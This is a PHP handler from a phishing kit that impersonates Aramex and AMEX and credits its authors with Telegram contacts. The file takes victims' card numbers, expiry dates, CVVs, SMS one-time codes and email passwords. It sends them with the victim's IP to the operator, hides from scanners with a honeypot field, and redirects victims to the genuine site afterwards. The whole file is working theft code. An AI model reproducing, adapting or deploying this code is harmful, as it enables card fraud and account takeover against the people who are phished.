<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/

    require_once 'includes/main.php';
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        header("Location: clients/cc.php?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorsms' ) {
            header("Location: clients/sms.php?error=1&verification#_");
            exit();
        }
        header("Location: clients/". $red .".php?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "cc") {
            $_SESSION['errors']      = [];
            $_SESSION['first_name']   = $_POST['first_name'];
            $_SESSION['last_name']   = $_POST['last_name'];
            $_SESSION['one']   = $_POST['one'];
            $_SESSION['two']     = $_POST['two'];
            $_SESSION['three']      = $_POST['three'];
            $date_ex     = explode('/',$_POST['two']);
            $card_number = validate_cc_number($_POST['one']);
            $card_cvv    = validate_cc_cvv($_POST['three'],$card_number['type']);
            $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);
            if( validate_name($_POST['first_name']) == false ) {
                $_SESSION['errors']['first_name'] = 'First name not valid';
            }
            if( validate_name($_POST['last_name']) == false ) {
                $_SESSION['errors']['last_name'] = 'Last name not valid';
            }
            if( $card_number == false ) {
                $_SESSION['errors']['one'] = 'Card number not valid';
            }
            if( $card_cvv == false ) {
                $_SESSION['errors']['three'] = 'CVV not valid';
            }
            if( $card_date == false ) {
                $_SESSION['errors']['two'] = 'Date not valid';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ARAMEX | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'First name : ' . $_POST['first_name'] . "\r\n";
                $message .= 'Last name : ' . $_POST['last_name'] . "\r\n";
                $message .= 'Card number : ' . $_POST['one'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                unset($_SESSION['errors']);
                header("Location: clients/loading1.php?verification#_");
            } else {
                header("Location: clients/cc.php?error#_");
            }
        }
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['sms_code']   = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = 'Code is not valid';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | NAME | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                if( $_POST['error'] > 0 ) {
                    header("Location: clients/office.php?verification#_");
                    exit();
                }
                $_SESSION['errors']['sms_code'] = 'Code is not valid';
                header("Location: clients/loading2.php?verification#_");
                exit();
            } else {
                $error = $_POST['error'];
                header("Location: clients/sms.php?error=$error&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "office") {
            $_SESSION['errors']      = [];
            $_SESSION['emaill']      = $_POST['emaill'];
            $_SESSION['password']    = $_POST['password'];
            $subject = get_client_ip() . ' | AMEX | Email Access';
            $message = '/-- EMAIL ACCESS INFOS --/' . get_client_ip() . "\r\n";
            $message .= 'Email Address : ' . $_POST['emaill'] . "\r\n";
            $message .= 'Password : ' . $_POST['password'] . "\r\n";
            $message .= '/-- END EMAIL ACCESS INFOS --/' . "\r\n";
            $message .= victim_infos();
            send($subject,$message);
            if( $_POST['error'] > 0 ) {
                session_destroy();
                header("Location: " . OFFICIAL_WEBSITE);
                exit();
            }
            header("Location: clients/office.php?error=1&verification#_");
            exit();
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>